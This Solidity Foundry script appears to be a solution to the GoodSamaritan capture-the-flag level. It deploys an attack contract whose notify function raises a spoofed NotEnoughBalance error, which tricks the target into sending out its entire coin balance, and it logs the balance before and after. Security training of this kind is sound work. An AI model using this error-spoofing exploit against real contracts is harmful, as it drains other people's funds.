// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/GoodSamaritan.sol";

contract GoodSamaritanSolve is Script {
    GoodSamaritan public gs = GoodSamaritan(0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Wallet Address : ", address(gs.wallet()));
        console.log("Coin Address : ", address(gs.coin()));
        console.log("Balance of Wallet", gs.coin().balances(address(gs.wallet())));

        new Attack().exploit();

        console.log("Balance of Wallet", gs.coin().balances(address(gs.wallet())));

        vm.stopBroadcast();
    }
}

contract Attack{
    error NotEnoughBalance();
    GoodSamaritan public gs = GoodSamaritan(0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2);

    function exploit() public{
        gs.requestDonation();
    }

    function notify(uint256 amount) external{
        if(amount <= 10){ // only revert when receiving 10 coins
            revert NotEnoughBalance();
        }
    }
}